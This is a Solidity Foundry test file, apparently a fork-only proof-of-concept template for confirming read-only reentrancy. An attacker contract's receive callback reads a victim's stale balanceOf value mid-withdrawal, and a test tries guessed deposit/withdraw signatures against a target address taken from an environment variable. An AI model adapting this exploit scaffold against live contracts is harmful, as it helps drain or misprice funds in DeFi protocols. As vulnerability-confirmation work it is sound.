// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Read-only reentrancy (stale view mid-callback)
/// @notice Detector: read-only-reentrancy. A view function reads state that
///         a mutating function only updates AFTER an external call. During
///         the callback the view returns a STALE value, and any contract
///         that prices / lends / settles off that view acts on wrong data.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt the view function to the
///      target's real one (balanceOf / getPrice / totalSupply / getReserves).

interface IVictim {
    function deposit() external payable;
    function withdraw() external;
    // TODO: the view that reads state updated after the external call.
    function balanceOf(address who) external view returns (uint256);
}

contract ReadOnlyAttacker {
    address public immutable victimAddr;
    uint256 public staleValue;
    bool public captured;
    bytes public withdrawCall;

    constructor(address victim_) {
        victimAddr = victim_;
    }

    /// Deposit and withdraw shapes are GUESSES on an unverified target, so the
    /// caller passes them. The capture happens inside the ETH callback, while
    /// the victim has paid out but not yet updated its accounting.
    function attack(bytes calldata depositData, bytes calldata withdrawData) external payable {
        withdrawCall = withdrawData;
        (bool d,) = victimAddr.call{value: msg.value}(depositData);
        require(d, "deposit shape reverted for this target");
        (bool w,) = victimAddr.call(withdrawData);
        require(w, "withdraw shape reverted for this target");
    }

    receive() external payable {
        if (!captured) {
            captured = true;
            // Mid-callback: the victim has sent ETH but not yet updated state.
            // The reader is a guess too.
            (bool ok, bytes memory ret) = victimAddr.staticcall(abi.encodeWithSignature("balanceOf(address)", address(this)));
            if (ok && ret.length >= 32) {
                staleValue = abi.decode(ret, (uint256));
            } else {
                (ok, ret) = victimAddr.staticcall(abi.encodeWithSignature("balanceOf(address,uint256)", address(this), uint256(0)));
                if (ok && ret.length >= 32) staleValue = abi.decode(ret, (uint256));
            }
        }
    }
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    /// The settled value, via the plausible readers. Never the call result.
    function _settled(address who) internal view returns (bool found, uint256 v) {
        (bool ok, bytes memory ret) = target.staticcall(abi.encodeWithSignature("balanceOf(address)", who));
        if (ok && ret.length >= 32) return (true, abi.decode(ret, (uint256)));
        (ok, ret) = target.staticcall(abi.encodeWithSignature("balanceOf(address,uint256)", who, uint256(0)));
        if (ok && ret.length >= 32) return (true, abi.decode(ret, (uint256)));
        (ok, ret) = target.staticcall(abi.encodeWithSignature("getBalance(address)", who));
        if (ok && ret.length >= 32) return (true, abi.decode(ret, (uint256)));
        return (false, 0);
    }

    /// One (deposit, withdraw) shape pair. Success is the view being STALE
    /// mid-callback — the read disagreeing with the settled read — never the
    /// calls returning.
    function _attemptPair(address attackerEOA, bytes memory dep, bytes memory wd, string memory label)
        internal
        returns (uint256 stale, uint256 settled, bool ok2)
    {
        ReadOnlyAttacker attacker = new ReadOnlyAttacker(target);
        vm.prank(attackerEOA);
        (bool ok,) = address(attacker).call{value: 1 ether}(
            abi.encodeWithSignature("attack(bytes,bytes)", dep, wd)
        );
        console.log("tried", label, ok ? "attack returned" : "attack reverted");
        if (!ok) return (0, 0, false);
        (bool found, uint256 v) = _settled(address(attacker));
        return (attacker.staleValue(), found ? v : 0, true);
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 10 ether);

        bytes memory d0 = abi.encodeWithSignature("deposit()");
        bytes memory d1 = abi.encodeWithSignature("deposit(uint256)", uint256(1 ether));
        bytes memory w0 = abi.encodeWithSignature("withdraw()");
        bytes memory w1 = abi.encodeWithSignature("withdraw(uint256)", uint256(1 ether));

        uint256 stale;
        uint256 settled;
        bool ran;
        bool reproduced;
        (stale, settled, ran) = _attemptPair(attackerEOA, d0, w0, "deposit() + withdraw()");
        if (ran) { console.log("stale:", stale, "settled:", settled); if (stale != settled) reproduced = true; }
        if (!reproduced) {
            (stale, settled, ran) = _attemptPair(attackerEOA, d0, w1, "deposit() + withdraw(uint256)");
            if (ran && stale != settled) reproduced = true;
        }
        if (!reproduced) {
            (stale, settled, ran) = _attemptPair(attackerEOA, d1, w0, "deposit(uint256) + withdraw()");
            if (ran && stale != settled) reproduced = true;
        }
        if (!reproduced) {
            (stale, settled, ran) = _attemptPair(attackerEOA, d1, w1, "deposit(uint256) + withdraw(uint256)");
            if (ran && stale != settled) reproduced = true;
        }

        assertTrue(
            reproduced,
            "no deposit/withdraw shape left the view stale mid-callback. Tried deposit()/deposit(uint256) with withdraw()/withdraw(uint256). This does NOT establish safety: the functions may be named differently, take other arguments, or the view may not be part of the vulnerable path."
        );
    }
}
